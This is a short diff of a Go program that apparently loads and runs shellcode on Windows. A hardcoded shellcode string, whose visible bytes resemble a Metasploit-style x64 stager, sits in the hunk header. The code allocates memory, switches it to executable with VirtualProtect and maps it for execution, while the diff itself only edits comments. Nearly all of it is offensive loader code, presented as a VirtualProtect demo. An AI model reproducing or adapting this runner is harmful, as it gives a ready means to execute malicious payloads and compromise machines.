@@ -26,7 +26,7 @@ var shellcode string = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50
 
 func main() {
 
-	// Marking as PAGE_EXECUTE_READ only so that we can demo VirtualProtect
+	// Marking as PAGE_READWRITE only so that we can demo VirtualProtect
 	addr, err := w32.VirtualAlloc(0, len(shellcode), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)
 	if err != nil {
 		panic(err)
@@ -34,6 +34,7 @@ func main() {
 
 	var mbi w32.MEMORY_BASIC_INFORMATION
 	w32.VirtualQuery(addr, &mbi, len(shellcode))
+	// Modify the permissions of the memory so that we can execute it.
 	w32.VirtualProtect(addr, len(shellcode), PAGE_EXECUTE_READWRITE, &mbi.Protect)
 
 	buf := (*[890000]byte)(unsafe.Pointer(addr))
